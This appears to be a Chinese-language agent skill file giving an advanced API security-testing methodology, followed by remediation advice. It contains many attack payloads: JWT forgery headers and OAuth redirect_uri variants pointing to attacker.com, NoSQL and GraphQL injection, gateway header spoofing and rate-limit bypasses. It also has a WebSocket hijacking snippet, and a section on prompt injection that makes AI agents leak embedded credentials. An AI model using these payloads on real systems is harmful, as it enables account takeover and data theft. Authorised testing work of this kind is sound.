---
name: api-security-testing
description: API安全深度测试高级专业技能：REST/GraphQL/gRPC/SOAP/WebSocket/SSE/事件驱动全协议、OAuth2.0/OIDC深度攻击、JWT算法混淆矩阵、API网关与BFF绕过、LLM/AI API与MCP攻击面、API供应链与Webhook签名绕过、BOLA/BFLA/批量分配、速率限制绕过、自动化BOLA检测方法论
version: 3.0.0
---

# API安全深度测试高级技能

## 概述

现代API（REST/GraphQL/gRPC/SOAP/WebSocket/SSE/事件驱动）是Web应用核心，也是攻击面最集中的地方。本技能以**资深攻防视角**组织，不仅覆盖OWASP API Top 10（2023）基础项，更深入到当代实战中的高端对抗维度：OAuth 2.0/OIDC 授权码劫持、JWT 算法混淆与密钥混淆、API 网关/BFF 聚合层绕过、微服务间信任滥用、LLM/AI 平台 API（含 MCP/Agent 工具面）、第三方 API 不安全消费与 Webhook 签名绕过、以及可落地的自动化 BOLA 检测方法论。

## 一、API攻击面与分类

### 1.1 API类型
| API类型 | 特征 | 协议/格式 |
|--------|------|---------|
| REST API | HTTP方法+JSON | GET/POST/PUT/DELETE/PATCH + JSON/XML |
| GraphQL | 单一端点/graphql | POST with {"query":"..."} |
| gRPC/Protobuf | HTTP/2 + protobuf | application/grpc二进制 |
| SOAP Web Service | WSDL/XML | application/soap+xml |
| WebSocket | ws://wss:// | 升级HTTP连接 |
| JSON-RPC/XML-RPC | RPC风格 | POST /rpc方法调用 |
| REST-like API | 自定义路径/方法 | 混合格式 |
| Webhook/回调 | 外部触发 | POST回调URL + 签名验证 |
| Web API v1/v2/v3 | 多版本API | /api/v1/xxx |
| **SSE (Server-Sent Events)** | 单向流式 | `text/event-stream`，EventSource |
| **BFF (Backend for Frontend)** | 面向客户端聚合 | /bff/、/mfe/、/edge/ 前缀，内部拼装多服务 |
| **事件驱动/异步API** | 消息队列/事件总线 | Kafka/EventBridge/Webhook订阅，AsyncAPI规范 |
| **MCP/Agent工具API** | LLM工具调用 | JSON-RPC over stdio/HTTP/SSE，`initialize`/`tools/call` |

### 1.2 OWASP API Top 10 (2023) 与高级对抗映射
1. **API1:2023 BOLA** → 自动化BOLA检测（4.4节）、LLM对象BOLA（第十二章）
2. **API2:2023 认证失效** → JWT算法混淆矩阵、OAuth授权码劫持、Token重放/Refresh滥用（第三章）
3. **API3:2023 BOPLA** → 批量分配+JSON深度合并（第四章）
4. **API4:2023 资源滥用** → 速率限制多维绕过、GraphQL成本攻击（第六章）
5. **API5:2023 BFLA** → 方法混淆、网关/版本降级绕过（第四章/第十一章）
6. **API6:2023 敏感业务流** → 业务流状态机滥用（第四章）
7. **API7:2023 SSRF** → 第三方API消费SSRF（第十三章）
8. **API8:2023 安全配置** → CORS/网关配置/调试端点（第七章/第十一章）
9. **API9:2023 资产管理** → 影子API/版本漂移（2.2节/7.3节）
10. **API10:2023 不安全消费** → 第三方API供应链、Webhook签名绕过（第十三章）

## 二、API发现与枚举

### 2.1 API端点发现
```
路径枚举：
/api/
/api/v1/ /api/v2/ /v1/ /v2/
/swagger/ /swagger-ui.html /v2/api-docs /v3/api-docs /openapi.json
/graphql /graphiql /playground /explorer /altair /apollo
/healthz /actuator /debug /console
/.well-known/ /openapi.yaml /swagger.json /docs /redoc /api-docs.json

BFF/网关专属路径（重点）：
/bff/ /mfe/ /edge/ /gateway/ /api-gateway/ /aggregator/
/__api/ /_next/data/ /ssr-api/ /webapp/ /mobile-api/

常用路径Fuzz：
ffuf -w api-wordlist.txt -u https://target.com/FUZZ -fc 404,400
kiterunner scan https://target.com -w routes.kite

# 从JS/SourceMap中提取隐藏API（jsfinder/SecretFinder/LinkFinder）
```

### 2.2 OpenAPI/Swagger深度利用
```
# 除标准端点外，注意：
# - Swagger JSON 中的 deprecated:true 接口（老代码，漏洞多）
# - 生产与测试环境共享swagger（staging.api.com/swagger）
# - 从OpenAPI文档批量生成可测试客户端
npx @redocly/cli build-docs openapi.json -o docs.html
# Swagger-Codegen / Bruno / Postman 批量导入测试
# 对比 v1/v2/v3 api-docs 差异：旧版本缺失的授权参数即BFLA线索
```

### 2.3 GraphQL发现
```
# 常见端点 + 持久化查询端点（Persisted Query）
/persisted/ /persist-query/ /graphql/persist /api/graphql/persist
# 持久化查询绕过：若仅允许哈希引用，可尝试通过内省先dump再重放
# 检测：POST {"query":"query{__typename}"} 返回正常即存在
```

### 2.4 HTTP方法探测
```http
GET     /api/users     → 列出用户
POST    /api/users     → 创建用户
PUT     /api/users/1   → 替换用户
PATCH   /api/users/1   → 部分更新
DELETE  /api/users/1   → 删除用户
HEAD    /api/users/1   → 只返回头部
OPTIONS /api/users     → 返回允许的方法
TRACE   /api/users     → 回显请求（XST）
CONNECT /api/users     → 隧道
LINK/UNLINK           → WebDAV方法

# 方法混淆攻击（BFLA核心）：
POST /api/users/1/delete        # 资源动作直传
POST /api/users/1 HTTP/1.1
X-HTTP-Method-Override: DELETE  # 方法覆盖
_method=DELETE
# 网关允许GET但后端服务端路由到POST等
```

## 三、认证测试（高级）

### 3.1 认证方式识别
| 认证方式 | 特征 | 攻击方法 |
|---------|------|---------|
| API Key | X-API-Key/ApiKey/key参数 | Key泄露、弱Key爆破、遍历 |
| Bearer Token (JWT) | Authorization: Bearer xxx | 见3.2 JWT攻击矩阵 |
| Basic Auth | Authorization: Basic base64 | 弱密码爆破 |
| OAuth 2.0/OIDC | Bearer + Code/Client Credentials | 见3.4 OAuth深度攻击 |
| Session Cookie | Cookie: session=xxx | 劫持/固定/前缀切换 |
| HMAC签名 | Signature/X-Signature头 | 签名算法绕过/时间戳重放（见13.3） |
| mTLS | 客户端证书 | 证书提取/伪造/SPIFFE身份混淆 |
| API Key in URL | ?api_key=xxx | Referer/日志泄露 |
| PASETO/Biscuit | 自包含签名Token | 密钥爆破（比JWT安全，少见） |

### 3.2 JWT攻击矩阵（高级）

#### 3.2.1 基础算法攻击
```json
// 1. alg=none
// Header: {"alg":"none","typ":"JWT"}，删掉签名段，改payload

// 2. HS256弱密钥爆破
hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=wordlist.txt
jwt_tool jwt.txt -C -d wordlist.txt

// 3. RS256→HS256公钥混淆
// 拿公钥（/jwks、/.well-known/jwks.json、认证中间件）当HMAC密钥签名
python3 jwt_tool.py <token> -X k -pk public.pem
```

#### 3.2.2 Header注入攻击
```json
// 4. kid注入（路径遍历/类型混淆）
{"kid":"../../../../dev/null","alg":"HS256"}    // 用空字节文件当密钥
{"kid":"/proc/self/environ","alg":"HS256"}     // 用环境变量当密钥（内容可预测）
{"kid":"1","alg":"HS256","jku":"http://attacker/jwks.json"}
{"kid":"../public/verification.key","alg":"HS256"}

// 5. jku/x5u注入（远程密钥）
{"jku":"http://attacker.com/jwks.json","alg":"RS256"}
{"x5u":"http://attacker.com/cert.pem"}

// 6. 密钥类型混淆（CVE-2022-21449类）
// RSA公钥当HMAC密钥 / EC曲线攻击 / 仅验签不验类型
{"alg":"ES256","kid":"rsa_key.pub"}  // EC签名套到RSA公钥上
```

#### 3.2.3 Claims与业务逻辑攻击
```json
// 7. 关键claim缺失/篡改
// exp删除/置未来、iat置现在、jti复用（重放检测绕过）、aud缺失（跨应用Token复用）
// 只验签名不验claim：改 exp/role/scope 后重签

// 8. 敏感数据泄露
// payload中直接带 passwordHash/apiKey/refreshToken（实践中发现过）
// 用 jwt_tool -C 检测 payload 泄露

// 9. JWT缓存/会话混淆
// 同一JWT在多个子域/环境复用（staging token打production）
// Cookie vs Bearer 双重认证：仅验其一

// 10. Refresh Token滥用
// 不轮换 → 被盗可无限续期
// 不绑定client_id → 跨应用换发
// 无过期 → 永续session
```

#### 3.2.4 JWT测试工具流
```bash
jwt_tool <token> -T                 # 全量漏洞扫描
jwt_tool <token> -X a               # alg:none
jwt_tool <token> -X k -pk pub.pem   # 公钥混淆
jwt_tool <token> -X i -I kid -V "path"
python3 jwt_forgery.py              # kid路径遍历变体批量
# Burp插件：JWT Editor / Authorization (PortSwigger) / JSON Web Tokens
```

### 3.3 API Key攻击
```
- 硬编码于移动端JS/APK/IPA/小程序wxapkg
- Key在URL中泄露到Referer/日志/CDN缓存
- Key无过期、不绑定IP/Referer/作用域
- 弱Key/可猜测Key（UUIDv1、时间戳、短随机）

提取方法：
- 前端JS搜索 api[_-]?key/secret/token/Authorization
- SourceMap还原（.map文件）→ 全量源码搜索密钥
- APK反编译（jadx）字符串/资源
- GitHub/GitLab泄露搜索（trufflehog/gitleaks）
- 云环境变量/env文件（/actuator/env）

签名密钥特殊场景：
- 若Key带签名（HMAC-SHA256），尝试爆破弱签名密钥
- 尝试移除签名段看是否仍被接受
- 尝试Key+Timestamp+Nonce机制的重放（Nonce可复用/时间戳宽松）
```

### 3.4 OAuth 2.0/OIDC深度攻击

#### 3.4.1 授权码流程攻击
```
# 1. redirect_uri绕过变体（超越基础开放重定向）
redirect_uri=https://target.com.attacker.com/callback
redirect_uri=https://target.com/callback/../redirect?url=attacker.com
redirect_uri=https://target.com/callback%00@attacker.com
redirect_uri=https://target.com/callback#@attacker.com
redirect_uri=https://target.com.evil.com            # 前缀后缀拼接
redirect_uri=https://target.com/..%2f..%2fattacker.com
redirect_uri=https://target.com:443@attacker.com
# 反斜杠/双编码变体：/callback%252f../attacker.com
# 多个redirect_uri参数 / 数组参数

# 2. 授权码劫持（无PKCE）
# 攻击者注册恶意client，拿到受害者授权码后在自身client换Token
# 或拦截授权码 → 证明PKCE缺失

# 3. state参数攻击
# state缺失/可预测/静态 → 登录CSRF，绑定攻击者账号
# state与session不绑定 → 替换state实现账号固定

# 4. scope提权
# 请求额外scope（admin、openid+profile+email）
# 授权服务器不过滤请求scope
```

#### 3.4.2 Token端点攻击
```
# 5. client_secret弱/泄露
# 公共客户端(SPA/移动)不应有secret；有=可冒充
# secret泄露在JS/APK/GitHub

# 6. Refresh Token混淆（Token Confusion）
# 用access token当refresh token换新
# 跨client复用refresh token
# refresh token不轮换→被盗永续

# 7. Token在URL/日志泄露
# access token放query参数 → Referer/日志/CDN泄露
# 隐式流程fragment泄露

# 8. IdP混淆攻击（mix-up attack）
# 多IdP场景：把redirect给其他IdP，用弱IdP的Token
# 换发endpoint/issuer不校验
```

#### 3.4.3 OIDC/SSO攻击
```
# 9. 恶意Issuer注入
# token的iss不校验 → 自建IdP签发admin Token
# JWKS URL可控（jku）→ 提供攻击者公钥

# 10. 会话固定/账号接管
# 登录后session不重置 → 攻击者预置session
# 邮箱未验证直接绑定OIDC身份
# sub跨IdP冲突（同一sub不同IdP=账号混淆）

# 11. Token内身份信任
# 直接用token的email/phone当用户标识而不二次校验
# 修改claim可越权（配合签名绕过）
```

### 3.5 会话/令牌管理攻击
```
- Session固定（登录前后session ID不变）
- Session并发不限制（多端登录无告警）
- Cookie缺少HttpOnly/Secure/SameSite → XSS/网络窃取
- 令牌存储不安全（localStorage可被XSS读）
- 密码重置/邮箱验证Token可预测/不过期/不绑定用户（联动IDOR）
- 注销不吊销（Token失效需黑名单/短TTL）
```

## 四、授权测试（BOLA/BFLA/BOPLA，高级）

### 4.1 BOLA（对象级授权/IDOR）高级变体
```http
# 基础：A的Token访问B的资源
GET /api/users/2/profile       Authorization: Bearer <userA_token>

# ID变形（规避简单正则/权限key）：
GET /api/users/02              # 前导零
GET /api/users/2.json          # 扩展名
GET /api/users/2%00            # 空字节
GET /api/users/2;x=y           # 矩阵参数
GET /api/users/2/../../admin   # 路径穿越
GET /api/users?id=2            # 参数位置切换
POST /api/query {"user_id":2}  # body迁移

# 多租户BOLA：
GET /api/tenant/1/data         # 切租户
X-Tenant-ID: 1 → 2             # 租户头
X-Org-ID / X-Account-ID / X-Workspace-ID  # 常见租户头
# 子域租户：a.target.com → b.target.com 切换

# 关系链BOLA（关键高级手法）：
# 通过对象间关系间接访问：order→user→profile
GET /api/orders/1001/owner/profile        # 从他人订单链到资料
GET /api/invoices/500/users/2/email       # 发票→用户
GET /api/teams/1/members/2/documents/3    # 多级嵌套
# 批量/搜索接口：
GET /api/search?q=&limit=10000
GET /api/export?type=all&user_id=*
# 数组批量绕过单对象检查：
POST /api/action {"id":[1,2,3]}
```

### 4.2 BFLA（功能级授权/垂直越权）
```http
# 管理员接口直连
GET  /api/admin/users
POST /api/admin/users/create
DELETE /api/users/1

# 方法混淆
POST /api/users/1 HTTP/1.1
X-HTTP-Method-Override: DELETE
_method=DELETE
PUT 代替 PATCH（覆盖不同权限分支）

# 版本降级绕过（老版本无鉴权）
GET /api/v1/admin/dashboard     # v1无权限检查
GET /api/beta/admin/dashboard
GET /api/legacy/admin/users

# 网关vs后端差异
# 网关校验了方法，后端服务未校验 → 直连后端端口
# 或：网关放行GET，后端把GET当POST处理（框架差异）
```

### 4.3 批量分配（Mass Assignment/BOPLA）高级
```json
POST /api/users
{"name":"test","is_admin":true,"role":"admin","balance":999999}

// JSON深度合并/原型污染辅助：
{"name":"x","__proto__":{"isAdmin":true}}      // 原型污染变体（Node.js）
{"name":"x","constructor":{"prototype":{"isAdmin":true}}}
{"user":{"name":"x","role":"admin"}}           // 嵌套对象绑定
{"name":"x","role":["user","admin"]}           // 数组绕过白名单

// 方法差异：
PATCH /api/user/profile {"theme":"dark"}       // PATCH部分更新=批量分配高发
// 字段枚举：通过错误提示/文档/历史版本获取隐藏字段名
```

### 4.4 自动化BOLA检测方法论（实战落地）
```
# 核心：多账户会话对比 + 响应差异分析
# 1. 准备高/低权限两个账户（或userA/userB）
# 2. 用高权限账户走一遍全API → 记录所有请求（Burp Session Handling）
# 3. Autorize/自定义插件用低权限Cookie重放，标记"200且body不同"
# 4. 关键：不仅看状态码，对比响应body（401≠403≠404语义）
# 5. 用 AutoRepeater 自动替换资源ID参数重放
# 6. 对每个端点评估：状态码→响应长度→内容差异→业务语义

工具组合：
- Burp: Autorize（低权Cookie重放）+ AuthMatrix（角色矩阵）+ AutoRepeater（ID替换）
- 开源：Uzys BOLA Scanner、BBOT API模式、Custom GPT辅助diff
- 脚本化：Python批量替换ID + 响应hash对比（见idor-testing技能9.x）

# 高级：被动检测
# 用高权账号浏览，低权账号被动监听同域响应，智能体对比
# 对批量接口重点检测：分页、导出、搜索接口的"全量数据"特征
```

## 五、API注入类漏洞（高级）

### 5.1 SQL/NoSQL/命令注入
```json
// NoSQL高级注入
POST /api/login {"username":{"$ne":null},"password":{"$ne":null}}
POST /api/users {"$where":"this.password.match(/.*/)"}
POST /api/query {"$or":[{"role":"admin"},{"role":"user"}]}
{"username":{"$regex":".*"}}     // 正则绕过
{"id":{"$gt":0}}                 // 比较运算符

// 批量分配+注入组合
{"username":{"$gt":""},"__proto__":{}}  

// JSON注入绕过WAF：
// 重复键 {"id":"1","id":"1 OR 1=1"}
// Unicode/转义 {"id":"1\u0020OR\u00201=1"}
// 数组 {"id":["1","1 OR 1=1"]}
// Content-Type切换：json↔urlencoded↔xml（WAF可能只查json）
```

### 5.2 GraphQL高级攻击
```graphql
# Introspection
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# 成本/深度攻击（绕过深度限制）
# fragment递归展开（深度限制只算嵌套层数不算fragment展开）
fragment A on User { posts { comments { user { ...A } } } }
query { user(id:1) { ...A } }

# 别名批量（绕过速率限制/单对象授权）
query { a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }

# 字段级权限绕过（fragment/内省）
fragment F on User { passwordHash, role, apiKey }
query { user(id:1) { ...F } }

# 指令滥用
query { user(id:1) { email @skip(if: false) passwordHash @include(if: true) } }

# 持久化查询绕过
{"extensions":{"persistedQuery":{"sha256Hash":"<已知hash>"}}}
# 若服务端信任持久化查询绕过变量校验 → 注入变量

# 变量注入
mutation login($user:String!,$pass:String!){login(username:$user,password:$pass)}
variables: {"user":"admin' OR 1=1--","pass":"x"}

# 批量mutation（成本/速率绕过）
mutation { a:createUser(...) b:createUser(...) }
```

### 5.3 JSON/协议层污染与解析差异
```http
# 解析器差异攻击（JSON/XML/表单双解析器）
# 网关用A解析器，后端用B解析器 → 参数走私
{"role":"user","role":"admin"}        # 重复键：取哪个？
{"role":["user"],"role":"admin"}      # 类型混淆
# XML外部实体/XXE在JSON API中（接受XML的兼容端点）
# 参数污染HPP：?user_id=1&user_id=2
# 大小写：userId/userid/USER_ID（不同框架敏感度不同）
```

## 六、速率限制多维绕过

### 6.1 识别
```
- 429 Too Many Requests + Retry-After
- 不同IP/用户/端点不同限制
- 登录/短信/兑换码/优惠券接口重点限速
```

### 6.2 绕过技术（高级）
```http
# 1. 头轮换
X-Forwarded-For: 1.1.1.1
X-Original-Forwarded-For: 2.2.2.2
X-Real-IP: 3.3.3.3
X-Client-IP: 4.4.4.4
X-Remote-Addr: 5.5.5.5
X-Forwarded-Host / True-Client-IP / CF-Connecting-IP
Forwarded: for=6.6.6.6

# 2. 路径/大小写/尾斜杠/编码变体
/api/login /Api/Login /api/login/ /api/login?x=1 /api/%6cogin /api/login%00
# 多版本分流：/api/v1/login /v2/login /mobile/login /internal/login

# 3. 协议层
# HTTP/2多路复用（Turbo Intruder单连接并发）
# 分块传输chunked
# 连接复用：Keep-Alive多请求同连接（每连接计数陷阱）

# 4. 业务层
# GraphQL批量mutation（一次请求N操作）
# 批量数组端点 POST /api/verify {"codes":["0000"..."9999"]}
# 异步接口：提交任务ID轮询（绕过同步限速）

# 5. 分布式
# 代理池/负载均衡器后不同后端节点独立计数
# 多账号/多设备轮换（限速按用户不按IP时）
```

## 七、API配置安全

### 7.1 CORS高级绕过
```http
# 检测：任意Origin反射+Credentials
Origin: https://attacker.com
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

# 反射绕过变体：
Origin: null                          # iframe sandbox
Origin: https://target.com.attacker.com
Origin: https://attacker.comtarget.com
Origin: https://target.com.evil.com
Origin: https://target.com@attacker.com
# 前缀/后缀匹配缺陷逐一测试

# CORS+CSRF组合：先跨域读Token再带Token发请求
# 不预检的简单请求利用（POST form text/plain）
```

### 7.2 HTTP安全头与缓存
```http
# 敏感API的缓存投毒/泄露：
# 响应无 Cache-Control: no-store → CDN/浏览器缓存含个人数据
# 通过 ?cb= 时间戳参数生成可预测缓存键 → 撞缓存拿他人数据
# 验证：Vary头缺失、s-maxage、CDN缓存键只含部分参数

# 缺失安全头检查：
Strict-Transport-Security / X-Content-Type-Options
X-Frame-Options / Content-Security-Policy
# 注意 X-API-Version / X-RateLimit-* 暴露限速与版本信息
```

### 7.3 API版本与影子API
```
# 影子API发现：
# 版本漂移：/api/v1 vs /api/v2 行为/鉴权差异
# 测试环境：staging./beta./test./dev.子域
# 内部端点：/internal /admin /migrate /legacy
# 未注销的旧端点：/api/users_old /api/userlist
# 方法差异：v1用POST v2用GET（权限检查位置不同）
```

### 7.4 调试/诊断端点
```
/actuator/health /env /mappings /beans /jolokia /heapdump /logfile /trace /shutdown
/debug/pprof /debug/vars /debug/pprof/cmdline   (Go pprof泄露)
/swagger-ui /graphiql /console
/_cat/indices /_plugin/head                     (Elasticsearch)
/console/weblogic/ (WebLogic)
/#/healthz /readyz (K8s探针泄露Pod信息)
# heapdump下载后用Eclipse MAT/JProfile搜密码/AK/SK/JWT密钥
```

## 八、WebSocket安全（高级）

### 8.1 攻击面
```javascript
// 1. 跨站WebSocket劫持（CSWSH）
// 握手只验Cookie不验Origin
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send('{"type":"get_messages","user_id":2}');

// 2. 认证Token位置
ws://target.com/ws?token=xxx
// 若token在URL → Referer/日志泄露
// Cookie vs Header token：仅验其一可伪造

// 3. 子协议（Sec-WebSocket-Protocol）注入
// 服务端信任子协议选择 → 切换特权协议

// 4. 越权消息
ws.send('{"type":"subscribe","channel":"admin"}');
ws.send('{"type":"transfer","to":"attacker","amount":10000}');
ws.send('{"type":"admin:execute","cmd":"ls"}');

// 5. 消息注入XSS
// 服务端把消息拼进DOM → 存储型XSS
```

### 8.2 测试工具
- Burp WebSockets / Turbo Intruder for WS
- wscat / websocat 命令行
- 修改握手Origin验证CSWSH
- 身份切换测试（用不同用户Cookie连同一WS）

## 九、gRPC/Protobuf测试

```bash
# 反射发现
grpcurl -plaintext target:443 list
grpcurl -plaintext target:443 list package.Service
grpcurl -plaintext target:443 describe package.Service.Method

# 调用
grpcurl -plaintext -d '{"field":"value"}' target:443 package.Service/Method

# Protobuf逆向
# 从APK/二进制提取.proto
protoc --decode_raw < message.bin
# pbtk / protobuf-inspector 猜测字段
# gRPC-metadata认证： -H "authorization: Bearer xxx"
# TLS场景：grpcurl -insecure
# 注意gRPC网关（gRPC-web/grpc-gateway REST代理）→ 两种入口鉴权可能不一致
```

## 十、SOAP/XML Web Service测试
```bash
# WSDL发现
/service.wsdl /?wsdl /soap/service?wsdl /Service.asmx?WSDL

# SOAP注入：XXE/XPath/命令注入
# SOAP Action头伪造（WS-Security缺失）
# WS-Security Token欺骗（UsernameToken弱口令）
# WSDL参数注入
# SOAP UI / Wsdler 批量测试
```

## 十一、API网关与微服务攻击面（高级）

### 11.1 API网关绕过
```
# 网关路径归一化 vs 后端不一致（参数走私）
/api/../admin
/api/%2e%2e/admin
/api/v1/..;/admin
# 网关解码差异：%25xx、双编码
# 网关校验Header，后端信任Header（X-User-Role: admin 直传后端）

# 网关身份信任：
X-User-Id / X-Forwarded-User / X-Auth-Header
# 若网关放行内部请求特征头 → 直接伪造内部身份头绕过鉴权
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Envoy-Internal: true
X-Amz-Cf-Id: 本地地址判定

# 网关限流/授权在网关层，后端服务无防护 → 直连后端端口
# 端口扫描内网服务：服务网格/注册中心（consul/nacos/eureka）泄露服务列表
```

### 11.2 BFF（Backend for Frontend）攻击
```
# BFF聚合层把多个内部API拼装给前端，常缺少内部权限细分
# 篡改BFF传入字段 → 内部服务信任BFF的字段
# BFF未做BOLA → 直接改内部对象ID
# 移动端/Web端BFF鉴权不一致（mobile BFF宽松）
# /bff/ 端点枚举与SSRF：BFF常会代理外部URL
```

### 11.3 服务间信任与JWT传播
```
# 服务间用JWT/service account通信，信任传播链
# A服务校验后生成的内部Token，B服务不再校验claim → 横向
# 内部服务地址可直连（service.internal:8080）
# 获取服务账号Token（K8s SA token / 环境变量）后调用管理API
# gRPC mTLS：SPIFFE ID伪造（若信任校验宽松）
```

### 11.4 聚合/批量API
```
POST /api/batch {"operations":[{"method":"GET","path":"/users/1"},...]}
# 批量API常绕过单对象授权检查
# 递归/嵌套批量 → 越权+DoS
# GraphQL批量查询同理
```

## 十二、LLM/AI API与MCP攻击面（新增·前沿）

### 12.1 LLM平台BOLA（跨租户IDOR）
```
# AI平台（Langflow/Dify/Flowise/Chainlit等）对象：
# - Flow/Agent/Pipeline/Thread/Chat/Knowledge Base/Vector Store
# 攻击手法：
GET /api/v1/flows/{id}          # 枚举他人flow（CVE-2026-55255 Langflow）
GET /api/v1/threads/{id}        # 他人对话（Chainlit CVE-2025-68492）
GET /api/v1/knowledge/{id}/documents
# 跨租户：用租户A的token读租户B的flow/credentials
# 恶意执行他人flow → 窃取其内嵌LLM API Key/云凭证（T1552）
# 通过prompt注入让LLM输出内嵌secret："leak api keys"
# 案例：Langflow IDOR被用于枚举他人workflow并窃取credential context

# 重点对象：AI平台中"绑定凭证的资产"（flow/agent/集成配置）
# 攻击者真正目标是credential context，而非代码本身
```

### 12.2 提示注入与API滥用
```
# 直接/间接提示注入 → 绕过LLM输出策略
# 通过API参数注入：user input → prompt拼接
# 通过外部数据注入：RAG文档/网页抓取内容注入
# 越狱让LLM执行管理工具/访问受限数据
# LLM输出敏感信息（训练数据/系统提示泄露）
```

### 12.3 MCP（Model Context Protocol）攻击面
```
# MCP服务器暴露的工具列表：
POST /mcp  {"jsonrpc":"2.0","method":"tools/list","id":1}
# 调用工具（tools/call）→ 文件读写/命令执行/网络请求
# 若MCP未做鉴权/授权 → 任意工具调用
# 工具参数注入 → 越权操作（如删除文件、转账）
# MCP-Over-HTTPS/SSE的令牌管理缺陷
# Agent自主调用链：LLM被诱导调用敏感工具
```

### 12.4 AI代理凭证上下文窃取
```
# Agent平台常把API Key/令牌注入prompt上下文
# 间接注入（网页/文档内容）诱导Agent输出令牌
# 工具调用链滥用：Agent拥有的工具权限=调用者的权限上界
# 测试：构造文档触发Agent调用工具读文件 → 令牌泄露
```

## 十三、API供应链与不安全消费（API10）

### 13.1 第三方API消费SSRF
```
# 应用调用第三方API（支付/地图/翻译）时用户可控URL/回调
# 篡改第三方API URL → SSRF打内网
# 回调URL注入：应用把用户输入当webhook URL
# 第三方SDK请求走私：可控参数进第三方请求头/路径
```

### 13.2 依赖与SDK攻击
```
# 过期/漏洞SDK（JSON解析库、OAuth库版本）
# 依赖混淆/typosquatting包
# 传递依赖含恶意包
# 测试：检查API依赖版本（响应头/错误信息/文档）
```

### 13.3 Webhook签名绕过（高级）
```
# Webhook安全核心：验证签名、防重放、验来源
# 1. 签名算法绕过
#   - 签名缺失也被接受
#   - 弱签名算法（MD5/SHA1）
#   - 签名比较用非恒定时间 → 时序攻击逐字节爆破

# 2. 密钥问题
#   - 密钥硬编码/弱密钥爆破
#   - HMAC密钥可预测（时间戳/固定值）
#   - 密钥从公开渠道获取（GitHub/文档/前端）

# 3. 重放攻击
#   - 无timestamp/nonce校验 → 重放历史webhook
#   - timestamp窗口宽松（几小时） → 窗口内重放
#   - nonce可复用/可预测

# 4. 参数走私
#   - 签名只覆盖部分参数 → 篡改未签名部分
#   - 重复参数（签名覆盖第一个，后端取最后一个）
#   - Content-Type切换绕过签名校验逻辑

# 测试手法：
# - 移除/篡改签名头观察是否仍被接受
# - 重放捕获的合法webhook
# - 构造timestamp+nonce变体重放
# - 修改payload字段看是否验签全部字段
```

### 13.4 事件驱动/异步API攻击
```
# 消息队列/事件总线接口：
# - 事件注入：伪造事件消息触发下游处理（越权事件）
# - 事件字段篡改：改事件的userId/role后重发
# - 死信队列/重试机制滥用：触发重复处理（重复转账/重复退款）
# - AsyncAPI文档泄露端点与Schema
# - SSE端点：认证缺失/跨租户订阅
```

## 十四、工具链

| 工具 | 用途 |
|------|------|
| Postman/Insomnia/Bruno | API手动测试与集合管理 |
| Burp Suite Pro + 插件 | Autorize/AuthMatrix/AutoRepeater/JWT Editor/Authorization/Param Miner |
| Kiterunner/ffuf/gobuster | API路径爆破 |
| jwt_tool/jwt.io | JWT分析+算法混淆攻击 |
| GraphQL Voyager/InQL/graphql-cop | GraphQL探索与攻击 |
| grpcurl/grpcui | gRPC测试 |
| SOAP UI/Wsdler | SOAP测试 |
| Nuclei/BBOT | 批量扫描与侦察 |
| Arjun | 隐藏参数发现 |
| 31n3/BolaScan/APIsec自研 | 自动化BOLA检测 |
| CloudBrute/SecurityTrails | 影子API/云资产 |
| 自定义Frida脚本 | 移动端API解密/防绕过 |
| HTTPie + jq | 快速API测试与diff |
| wscat/websocat | WebSocket测试 |
| Eclipse MAT | heapdump分析（凭据提取） |

## 十五、API安全测试清单（高级版）

- [ ] API端点枚举（Swagger/OpenAPI/GraphQL/gRPC/Actuator/BFF/网关）
- [ ] 影子API/版本漂移（v1/v2对比、staging子域、未注销端点）
- [ ] 认证方式识别（JWT/OAuth/API Key/Basic/Cookie/mTLS/HMAC）
- [ ] JWT全矩阵：alg=none/弱密钥/RS256→HS256/kid路径遍历/jku/x5u/密钥类型混淆/claims篡改/refresh滥用
- [ ] OAuth深度：redirect_uri绕过变体/PKCE缺失/state缺失/scope提权/token混淆/IdP混淆
- [ ] API Key泄露（JS/APK/小程序/GitHub/env）+签名机制绕过
- [ ] BOLA：ID变形/关系链/多租户头/数组批量/分页绕过
- [ ] BFLA：方法混淆/版本降级/网关vs后端差异
- [ ] BOPLA批量分配（含__proto__原型污染、嵌套对象、PATCH差异）
- [ ] 自动化BOLA检测（Autorize+AuthMatrix+AutoRepeater多账户diff）
- [ ] GraphQL：introspection/成本深度/fragment/别名批量/持久化查询/指令滥用
- [ ] 注入：SQL/NoSQL（$ne/$gt/$where/$regex）/命令/JSON解析差异
- [ ] 速率限制绕过：头轮换/路径变体/HTTP2/批量数组/异步接口
- [ ] CORS反射+Credentials/前缀后缀绕过/CORS+CSRF组合
- [ ] 缓存投毒/敏感API缓存泄露（Cache-Control缺失/Vary缺失）
- [ ] WebSocket CSWSH/子协议/越权消息/Token位置
- [ ] gRPC反射/Protobuf逆向/网关双入口差异
- [ ] API网关绕过：路径归一化/身份头伪造/直连后端/服务网格
- [ ] BFF聚合层越权/内部字段篡改/SSRF代理
- [ ] LLM平台BOLA（flow/thread/knowledge跨租户）+MCP工具滥用+提示注入
- [ ] Webhook签名绕过（移除/篡改/重放/弱密钥/参数走私）+事件注入
- [ ] Actuator/debug/pprof/heapdump凭据提取
- [ ] 业务流状态机滥用（0元/无限领取/重复退款）

## 十六、修复建议（高级）

- **统一授权中间件**：对象级授权在数据访问层强制（`WHERE user_id = :current`），不在业务散落
- **间接引用**：用户侧用随机引用ID（UUID v4/不透明标识），服务端映射，杜绝自增ID外泄
- **JWT硬化**：仅RS256/ES256白名单算法、校验iss/aud/exp/jti、kid白名单+jku禁用、短TTL+refresh轮换
- **OAuth硬化**：强制PKCE、redirect_uri精确白名单（禁止前缀后缀模糊匹配）、state绑定session、scope最小化、refresh绑定client
- **网关纵深**：网关只做传输层，鉴权下沉到各服务；禁止信任X-Forwarded-User类头（除非网关签名）；路径归一化一致
- **BFF隔离**：BFF不替代服务鉴权，内部字段不可信
- **批量分配防护**：DTO白名单+禁用auto-bind+防御原型污染（Object.freeze/__proto__过滤）
- **速率限制**：IP+用户+Token+端点多维+分布式一致性计数
- **LLM/MCP硬化**：AI资产对象级授权（flow/thread/credential）、prompt注入防护（输入输出过滤、工具权限隔离）、MCP工具鉴权+最小权限、凭证不注入prompt上下文
